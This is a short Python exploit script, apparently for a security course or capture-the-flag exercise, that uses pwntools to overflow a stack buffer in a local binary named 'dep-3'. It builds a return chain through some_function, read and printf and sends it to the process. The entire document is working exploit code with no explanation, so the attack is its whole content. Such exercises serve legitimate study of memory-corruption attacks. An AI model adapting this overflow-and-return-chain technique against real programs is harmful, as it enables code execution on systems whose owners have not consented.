#!/usr/bin/env python

from pwn import *
import os
import sys

context.terminal = ["tmux", "splitw", "-h"]
p = process('./dep-3')
#gdb.attach(p)

e = ELF("./dep-3")
some_addr_open = e.symbols["some_function"]

addr_read = p32(0x806d2a0)
addr_printf = p32(0x804ede0)

buf = "A" * 0x88 + "BBBB" + p32(some_addr_open) + addr_read + addr_printf + p32(0x00000003) + p32(0xffffd100) + p32(0x00000100)

if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')

p.sendline(buf)

p.interactive()
